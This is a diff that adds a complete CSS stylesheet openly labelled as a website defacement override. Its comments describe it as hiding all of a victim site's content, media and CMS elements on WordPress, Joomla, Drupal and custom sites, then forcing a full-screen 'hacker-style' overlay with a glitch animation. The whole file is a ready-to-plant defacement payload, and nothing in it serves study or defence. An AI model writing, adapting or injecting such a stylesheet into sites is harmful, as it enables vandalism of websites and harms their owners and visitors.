@@ -1,0 +1,130 @@
+/* 
+ * CSS Override for Defacement
+ * Purpose: Hide original website content, force full-screen overlay, prevent interaction with underlying elements.
+ * Compatibility: Works on standard HTML/CSS websites (WordPress, Joomla, Drupal, Custom).
+ */
+
+/* 1. Global Reset & Overflow Prevention */
+html, body {
+    margin: 0;
+    padding: 0;
+    width: 100%;
+    height: 100%;
+    overflow: hidden; /* Prevents scrollbars from appearing if content is hidden */
+    background-color: #000000; /* Fallback black background */
+}
+
+/* 2. Target Common Website Containers */
+/* This selects most common wrapper divs used by themes */
+body > *, 
+div[class*="header"], 
+div[class*="nav"], 
+div[class*="menu"], 
+div[class*="footer"], 
+div[class*="content"], 
+section, 
+article, 
+aside, 
+nav, 
+header, 
+footer {
+    display: none !important; /* Hides all major structural elements */
+}
+
+/* 3. Specific Overrides for Popular CMS Structures (Fallback) */
+/* If the generic selector above misses something, these catch common IDs/classes */
+#wpadminbar, 
+#page-wrapper, 
+#wrapper, 
+#main-wrapper, 
+#container, 
+#content-wrapper, 
+.site-header, 
+.site-footer, 
+.main-navigation, 
+.footer-widgets, 
+.entry-content, 
+.page-content {
+    display: none !important;
+}
+
+/* 4. Ensure Images and Media are Hidden */
+img, 
+video, 
+audio, 
+canvas, 
+svg, 
+iframe {
+    display: none !important;
+}
+
+/* 5. The Defacement Overlay Container */
+.deface-overlay {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100vw;
+    height: 100vh;
+    z-index: 999999 !important; /* Ensures it sits on top of everything */
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+    align-items: center;
+    background: linear-gradient(135deg, #000000 0%, #1a1a1a 100%); /* Dark gradient */
+    color: #ffffff;
+    font-family: 'Courier New', Courier, monospace; /* Hacker-style font */
+    text-align: center;
+    box-sizing: border-box;
+}
+
+/* 6. Typography for the Overlay */
+.deface-overlay h1 {
+    font-size: 3rem;
+    margin: 0;
+    text-transform: uppercase;
+    letter-spacing: 5px;
+    color: #ff0000; /* Red header for impact */
+    text-shadow: 2px 2px 4px #000000;
+}
+
+.deface-overlay p {
+    font-size: 1.2rem;
+    margin: 10px 0;
+    color: #cccccc;
+}
+
+.deface-overlay .tag {
+    font-size: 1.5rem;
+    color: #00ff00; /* Green tag */
+    margin-top: 20px;
+    font-weight: bold;
+}
+
+/* 7. Handle Potential Scrollbars */
+::-webkit-scrollbar {
+    display: none;
+}
+
+/* 8. Mobile Responsiveness */
+@media (max-width: 768px) {
+    .deface-overlay h1 {
+        font-size: 2rem;
+    }
+    .deface-overlay p {
+        font-size: 1rem;
+    }
+}
+
+/* 9. Animation for Glitch Effect (Optional but cool) */
+@keyframes glitch {
+    0% { transform: translate(0) }
+    20% { transform: translate(-2px, 2px) }
+    40% { transform: translate(-2px, -2px) }
+    60% { transform: translate(2px, 2px) }
+    80% { transform: translate(2px, -2px) }
+    100% { transform: translate(0) }
+}
+
+.deface-overlay:hover h1 {
+    animation: glitch 0.2s infinite;
+}
